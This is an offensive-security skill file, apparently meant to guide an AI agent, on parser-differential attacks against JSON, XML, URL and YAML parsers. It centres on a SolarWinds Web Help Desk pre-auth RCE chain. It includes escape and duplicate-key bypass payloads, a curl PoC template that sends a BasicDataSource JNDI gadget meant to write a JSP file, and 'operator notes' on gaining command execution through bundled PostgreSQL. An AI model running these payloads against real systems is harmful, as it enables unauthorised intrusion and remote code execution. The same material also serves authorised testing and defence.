---
name: parser-differential-attacks
description: "Exploit disagreements between two parsers reading the same JSON/XML — Jackson vs org.json, sanitizer vs application, gateway vs backend — to smuggle payloads past WAFs and validation, as in the SolarWinds Web Help Desk pre-auth RCE. Use when requests pass through a sanitizing proxy or API gateway before the app, or when a Java app carries multiple JSON libraries on the classpath."
---

# JSON/XML Parser Differential Attacks

## Crown Jewel Targets

- SolarWinds Web Help Desk (Jackson sanitizer + org.json parser = pre-auth RCE)
- Java enterprise apps with multiple JSON libraries in classpath
- API gateways with JSON sanitization separate from application processing
- Products using JSON-RPC with mixed parser implementations
- WebObjects applications (`wopage` parameter for endpoint attachment)
- Any app with bundled PostgreSQL on trust authentication

## Attack Surface Signals

- Multiple JSON/XML libraries in dependency tree (`pom.xml`, `package.json`)
- WAF/sanitizer layer separate from application processing
- Error messages mentioning different parser names (Jackson, Gson, org.json)
- WebObjects indicators: `wo`, `wopage`, `wosid` parameters
- Bundled database ports: 20293, 5432, 3306 on localhost

**Source:** WatchTowr Labs (SolarWinds WHD, 2026), general research
**CVEs:** CVE-2025-40552, CVE-2025-40553, CVE-2025-40554
**Severity:** HIGH-CRITICAL
**Affected:** Any application using different parsers for sanitization vs processing

## Overview

Parser differentials occur when a sanitizer/WAF uses a different parser than the application's processing layer. Differences in escape sequence handling, encoding support, structural rules, and edge case behavior allow attackers to craft payloads that pass sanitization but execute in the application parser.

## Technical Details

### SolarWinds WHD Chain (CVE-2025-40552/53/54)

The SolarWinds Web Help Desk uses Jackson as a JSON sanitizer but jabsorb's org.json as the actual JSON parser. The differences between these two parsers create a complete auth-bypass-to-RCE chain:

1. **`\xNN` hex escapes**: Jackson rejects `\xNN` as invalid JSON, but org.json handles them. Payloads containing `\x` bypass Jackson validation entirely (Jackson throws → sanitizer falls back to non-JSON mode).

2. **`\"` double-decoding**: Jackson processes `\"` as an escaped quote. When the sanitizer checks `isJSON()`, a payload starting with `\"` makes the check return false because Jackson sees an unquoted string. The sanitizer then applies non-JSON (string) sanitization, which does not strip deserialization gadgets.

3. **WebObjects `wopage` parameter**: Attaches arbitrary page components to unauthenticated sessions, reaching the jabsorb JSON-RPC endpoint without authentication.

4. **Gadget chain**: `BasicDataSource` JNDI gadget connects to the bundled PostgreSQL instance (trust authentication, port 20293). From there, `COPY FROM PROGRAM` executes arbitrary OS commands.

```
Unauth session → wopage=jabsorb endpoint → \xNN bypass Jackson →
org.json parses fine → BasicDataSource JNDI → bundled PostgreSQL
(trust auth, :20293) → COPY FROM PROGRAM → RCE
```

### Parser Differential Categories

**JSON parsers** (Jackson vs Gson vs org.json vs Fastjson vs simplejson):
- Escape handling: `\xNN` (hex), `\0` (null), `\v` (vertical tab), `\/` (forward slash)
- Duplicate keys: first-wins vs last-wins vs error
- Comments: `//` and `/* */` accepted by some, rejected by others
- Trailing commas: accepted by Gson/Fastjson, rejected by Jackson strict mode
- Numeric formats: hex `0xFF`, octal `0777`, leading zeros, `+1`
- Unquoted keys: accepted by some parsers, rejected by strict parsers

**XML parsers** (different entity handling, DTD processing):
- Entity expansion: billion laughs limits vary
- DTD processing: enabled by default in some, disabled in others
- Namespace confusion: prefix rebinding, default namespace override
- Processing instructions: `<?xml-stylesheet?>` handling varies
- CDATA in attributes: some parsers accept, others reject

**URL parsers** (browsers vs servers vs libraries):
- Backslash handling: `http://evil.com\@good.com` parsed differently
- Authority confusion: `http://user@evil.com:80@good.com`
- Fragment behavior: `#` stops parsing in some but not others
- Encoded slashes: `%2F` vs `/` in path normalization
- Semicolon parameters: `;jsessionid=` parsed or passed through

**YAML parsers** (SnakeYAML vs PyYAML vs go-yaml):
- Anchors and aliases: `*alias` expansion limits vary
- Merge keys: `<<:` supported inconsistently
- Tags: `!!python/object` for code execution in PyYAML
- Boolean coercion: `yes`, `no`, `on`, `off` as booleans

### Bundled Database Trust Auth Pattern

Products shipping with bundled PostgreSQL or MySQL configured for localhost trust authentication provide instant RCE once you reach the internal port via SSRF, deserialization, or any network pivot:

- **PostgreSQL trust auth**: No password needed from localhost. `COPY FROM PROGRAM` or `lo_export` for file write + RCE.
- **MySQL trust auth**: `LOCAL INFILE` for file read, UDF loading for RCE.
- **Common bundled DB ports**: 20293 (SolarWinds), 5432 (standard PG), 3306 (standard MySQL), random high ports.

## Detection Indicators

- Multiple JSON/XML libraries in dependency tree (check `pom.xml`, `package.json`, `requirements.txt`)
- WAF/sanitizer layer separate from application processing
- Error messages mentioning different parser names
- Inconsistent handling of malformed input (WAF accepts, app rejects or vice versa)
- Java `.war` files with both Jackson and org.json/Gson JARs
- WebObjects technology indicators (`wo`, `wopage`, `wosid` parameters)

## Testing Methodology

### Step 1: Identify the Parser Chain

Map which parser handles sanitization and which handles execution:
```
WAF/filter → sanitizer parser → application parser → sink
```

### Step 2: Test Escape Sequences

```json
{"key": "\x41"}           // hex escape (org.json: A, Jackson: error)
{"key": "\0hidden"}        // null byte
{"key": "val\                
ue"}                       // literal newline in string
{"key": "\v\f"}            // vertical tab, form feed
```

### Step 3: Test Structural Differences

```json
// Duplicate keys (which wins?)
{"admin": false, "admin": true}

// Comments
{"key": "value" /* comment */}
{"key": "value" // comment
}

// Trailing commas
{"key": "value",}
[1, 2, 3,]

// Unquoted keys
{key: "value"}
```

### Step 4: Test Encoding Edge Cases

```
// Overlong UTF-8 for '/' (0x2F)
\xC0\xAF  (2-byte overlong)
\xE0\x80\xAF  (3-byte overlong)

// BOM prefix
\xEF\xBB\xBF{"key": "value"}

// Null bytes mid-string
{"ke\x00y": "value"}
```

### Step 5: Chain to Deserialization

If parser differential bypasses sanitization, check if the downstream parser feeds into a deserialization sink (Java readObject, jabsorb, PHP unserialize, Ruby Marshal.load).

## PoC Template

```bash
# Test Jackson vs org.json differential
# If Jackson sanitizes, \xNN makes it reject → non-JSON sanitization path
curl -X POST TARGET/jsonrpc \
  -H "Content-Type: application/json" \
  -d '{"method": "\x65vil", "params": [{"javaClass": "org.apache.commons.dbcp.BasicDataSource", "driverClassName": "org.postgresql.Driver", "url": "jdbc:postgresql://localhost:20293/whd?loggerLevel=DEBUG&loggerFile=../webapps/helpdesk/exploit.jsp"}]}'

# Test duplicate key differential
curl -X POST TARGET/api \
  -H "Content-Type: application/json" \
  -d '{"role": "user", "role": "admin"}'
```

## Bug Bounty Relevance

- **Severity**: HIGH-CRITICAL. Parser differentials are the #1 WAF bypass technique.
- **Where to look**: Enterprise Java apps (most likely to mix parsers), API gateways with sanitization layers, products using JSON-RPC.
- **Quick wins**: Check bundled dependencies for multiple JSON/XML parsers. Test `\xNN` and duplicate keys on every JSON endpoint behind a WAF.
- **Chain potential**: Parser differential → sanitizer bypass → deserialization → RCE is a proven pattern.

## Reference Writeups

- [WatchTowr: SolarWinds WHD Pre-Auth RCE via Parser Differential](https://labs.watchtowr.com/we-aint-afraid-of-no-ghosts-solarwinds-web-help-desk/) (2026)
- [Parser Differentials in JSON libraries](https://bishopfox.com/blog/json-interoperability-vulnerabilities)
- [An Exploration of JSON Interoperability Vulnerabilities](https://seriot.ch/projects/parsing_json.html)

## Operator Notes (Battle-Tested)

- **`\xNN` is the universal Jackson bypass**: Jackson rejects `\xNN` hex escapes. If the sanitizer uses Jackson and falls back to non-JSON mode on error, the downstream parser (org.json, Fastjson) processes it fine. Test `\x41` in every JSON endpoint behind a WAF.
- **Duplicate key confusion**: `{"role": "user", "role": "admin"}` — Jackson takes first, org.json takes last (or vice versa). Test on every role/permission field.
- **Bundled database trust auth = instant RCE**: Products shipping PostgreSQL on localhost:20293 with trust auth. Reach via SSRF, deserialization, or any network pivot. `COPY FROM PROGRAM` for command execution.
- **Check `pom.xml` for mixed parsers**: If both `com.fasterxml.jackson` and `org.json` are in the dependency tree, parser differential is highly likely.
- **Comments and trailing commas**: `{"key": "value" /* comment */}` and `{"key": "value",}` — some parsers accept, others reject. Use to detect which parser is active at each layer.
- **Chain to deserialization**: Parser differential bypasses sanitization. If the downstream parser feeds into a deserialization sink, the chain goes to RCE.

## Related Skills & Chains

| Pattern | Chain Potential |
|---------|---------------|
| `waf-bypass` | WAF-specific bypass techniques |
| `waf-bypass` → `references/waf-generic-evasion.md` | General WAF evasion |
| `deserialization-testing` → `references/java-hessian-deserialization.md` | Deser after parser bypass |
| `deserialization-testing` → `references/dotnet-deserialization-advanced.md` | .NET deser after bypass |
| `deserialization-testing` → `references/java-deserialization-rce.md` | Java deser gadget chains |
